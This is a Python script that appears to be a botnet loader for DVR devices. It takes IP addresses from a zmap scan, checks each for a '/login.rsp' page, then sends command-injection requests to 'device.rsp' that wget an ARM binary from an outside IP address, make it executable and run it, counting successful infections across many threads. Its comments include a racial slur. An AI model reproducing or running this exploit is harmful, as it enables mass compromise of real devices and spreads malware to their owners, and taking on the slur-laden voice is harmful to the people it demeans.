import requests
import threading
import sys
import time
import requests
import logging
# Suppress logging for requests
#logging.basicConfig(level=logging.CRITICAL)
logging.disable(logging.CRITICAL)
#zmap -p 9000 -w kr.zone -q | python3 tbk.py 9000
#FUCKIN WRITTEN BY AKAMAIHEAT PUBLIC RELOADED NIGGA I MADE THIS SHIT KNIFE SHARP AGAIN
#port 80/9000 "Location: /login.rsp"
# Define global counters
total_ips_processed = 0
ips_with_zenci = 0

# Define a lock to synchronize access to the counters
counter_lock = threading.Lock()

# Define the headers for the request
headers = {
    "User-Agent": "curl/7.74.0",
    "Accept": "*/*",
    "Cookie": "uid=1",
}
target_port = sys.argv[1]
# Function to execute the exploit for a given IP
def load_bot(target_ip):
    global total_ips_processed, ips_with_zenci
    #target_port = "9000"  # Assuming the same port for all IPs

    # Step 1: Send an initial request to check for "Location: /login.rsp"
    login_check_url = f"http://{target_ip}:{target_port}"
    response = requests.get(login_check_url, headers=headers, allow_redirects=False,timeout=1)

    # Check if "Location: /login.rsp" is in the response headers
    if 'login.r' in response.text:
        print(f"Location: /login.rsp found for {target_ip}, proceeding with exploit...")

        # Define the commands in the correct order
        commands = [
            "wget+http://198.98.51.68/GOONGANGONTOP/arm7+-O+/tmp/a",  # First command (wget)
            "chmod+777+/tmp/a",                            # Second command (chmod)
            "/var/tmp/./a+dvr"                             # Third command (run the script)
        ]

        # Send a request for each command
        for i, command in enumerate(commands):
            exploit_url = f"http://{target_ip}:{target_port}/device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc={command}"
            print(exploit_url)
            response = requests.get(exploit_url, headers=headers,timeout=15)
            print(f"Sent command: {command} to {target_ip}")

            # If it's the last command, check if "zenci" is in the response
            if i == len(commands) - 1:  # Last command (run the script)
                if 'zenci' in response.text:
                    print(f"TRUE + {target_ip}")
                    with counter_lock:
                        ips_with_zenci += 1
                else:
                    print(f"Command executed, but 'zenci' not found in response for {target_ip}.")
    else:
        pass
#        print(f"Location: /login.rsp not found for {target_ip}, aborting exploit.")

    # Increment the processed IPs counter
    with counter_lock:
        total_ips_processed += 1

def worker(target_ip):
    try:
        load_bot(target_ip)
    except:
        pass
# Function to display the status every second
def display_status():
    while True:
        with counter_lock:
            print(f"Total IPs Processed: {total_ips_processed}, IPs with 'zenci': {ips_with_zenci}")
        time.sleep(1)

# List to hold the threads
threads = []

# Create and start the status thread
status_thread = threading.Thread(target=display_status)
status_thread.daemon = True  # This ensures the thread exits when the main program exits
status_thread.start()

# Reading IPs from stdin and processing each IP
for ip in sys.stdin:
    ip = ip.strip()  # Remove leading/trailing whitespace
    if ip:  # If IP is not empty
        # Create and start a thread for each IP
        thread = threading.Thread(target=worker, args=(ip,))
        threads.append(thread)
        thread.start()

# Wait for all threads to finish processing
for thread in threads:
    thread.join()

# Since the main threads are done, print the final count
print(f"Final Count - Total IPs Processed: {total_ips_processed}, IPs with 'zenci': {ips_with_zenci}")

